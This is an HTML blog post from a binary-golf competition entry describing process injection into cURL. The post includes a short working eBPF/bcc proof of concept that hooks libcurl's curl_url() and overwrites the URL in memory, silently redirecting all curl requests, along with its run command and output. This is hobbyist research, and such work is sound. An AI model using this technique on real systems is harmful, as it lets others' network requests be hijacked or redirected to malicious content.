@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>bggp4 - hypblog</title><meta name="Description" content="hyplog"><meta property="og:title" content="bggp4" />
+<meta property="og:description" content="eBPF Filter For my (first) bggp4 entry, I wanted to do something with process injection. I decided to target cURL for obvious reasons.
+I initially started off exploring what I could do with PTRACE, however the binary produced was pretty large (around 14kb) and I didnot have a good way of detecting when new curl processes started and attaching to them.
+Thinking more about the problem of detecting newly started processes, I decided to look into eBPF as an option." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scratchadams.github.io/posts/bggp4/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-26T12:09:09-04:00" />
+<meta property="article:modified_time" content="2024-06-26T12:09:09-04:00" /><meta property="og:site_name" content="hyplog" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="bggp4"/>
+<meta name="twitter:description" content="eBPF Filter For my (first) bggp4 entry, I wanted to do something with process injection. I decided to target cURL for obvious reasons.
+I initially started off exploring what I could do with PTRACE, however the binary produced was pretty large (around 14kb) and I didnot have a good way of detecting when new curl processes started and attaching to them.
+Thinking more about the problem of detecting newly started processes, I decided to look into eBPF as an option."/>
+<meta name="application-name" content="hyplog">
+<meta name="apple-mobile-web-app-title" content="hyplog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://scratchadams.github.io/posts/bggp4/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "bggp4",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/scratchadams.github.io\/posts\/bggp4\/"
+        },"genre": "posts","wordcount":  258 ,
+        "url": "https:\/\/scratchadams.github.io\/posts\/bggp4\/","datePublished": "2024-06-26T12:09:09-04:00","dateModified": "2024-06-26T12:09:09-04:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "hyp"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="hypblog">hyplog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="hypblog">hyplog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">bggp4</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>hyp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-06-26">2024-06-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;258 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ebpf-filter">eBPF Filter</a></li>
+    <li><a href="#overwriting-the-url-passed-to-curl">Overwriting the URL passed to cURL</a></li>
+    <li><a href="#poc">PoC</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="ebpf-filter">eBPF Filter</h2>
+<p>For my (first) bggp4 entry, I wanted to do something with process injection. I decided to target cURL for obvious reasons.</p>
+<p>I initially started off exploring what I could do with PTRACE, however the binary produced was pretty large (around 14kb) and I didnot have a good way of detecting when new curl processes started and attaching to them.</p>
+<p>Thinking more about the problem of detecting newly started processes, I decided to look into eBPF as an option. This turned out to be a good option for both the process detection and reading/writing from process memory.</p>
+<h2 id="overwriting-the-url-passed-to-curl">Overwriting the URL passed to cURL</h2>
+<p>During my initial attempts with PTRACE, I discovered that cURL will eventually make a call to curl_url() with the RDX register set to the URL that was passed to cURL through command line arguments. So by attaching a uprobe to the curl_url() function in the libcurl shared library object, I could overwrite the value for RDX, essentially redirecting cURL to the URL of choice.</p>
+<h2 id="poc">PoC</h2>
+<pre tabindex="0"><code>import sys
+from bcc import BPF
+BPF(text=&#34;&#34;&#34;#include &lt;uapi/linux/ptrace.h&gt; 
+void c(struct pt_regs *ctx) {char b[24] = &#34;https://binary.golf/5/5&#34;;
+bpf_probe_write_user((void *)ctx-&gt;dx, b, 24);
+};&#34;&#34;&#34;).attach_uprobe(name=sys.argv[1], sym=&#34;curl_url&#34;, fn_name=&#34;c&#34;)
+while 1:1
+</code></pre><p>This PoC requires bcc for the eBPF python bindings and takes the path to libcurl&rsquo;s shared object file as an argument</p>
+<pre tabindex="0"><code>root@hop:~/bggp/py# python3 g5.py /usr/lib/x86_64-linux-gnu/libcurl.so.4
+</code></pre><p>Any cURL executions that take place while this filter is running should redirect to the <a href="https://binary.golf/5/5" target="_blank" rel="noopener noreffer ">https://binary.golf/5/5</a> url and download/display the file contents.</p>
+<pre tabindex="0"><code>hyp@hop:~$ curl https://google.com
+Another #BGGP5 download!! @binarygolf https://binary.golf
+hyp@hop:~$ curl https://test.test.test
+Another #BGGP5 download!! @binarygolf https://binary.golf
+hyp@hop:~$ 
+</code></pre></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-06-26</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://scratchadams.github.io/posts/bggp4/" data-title="bggp4"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://scratchadams.github.io/posts/bggp4/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://scratchadams.github.io/posts/bggp4/" data-title="bggp4"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://scratchadams.github.io/posts/bggp4/" data-title="bggp4"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://scratchadams.github.io/posts/bggp4/" data-title="bggp4"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.113.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
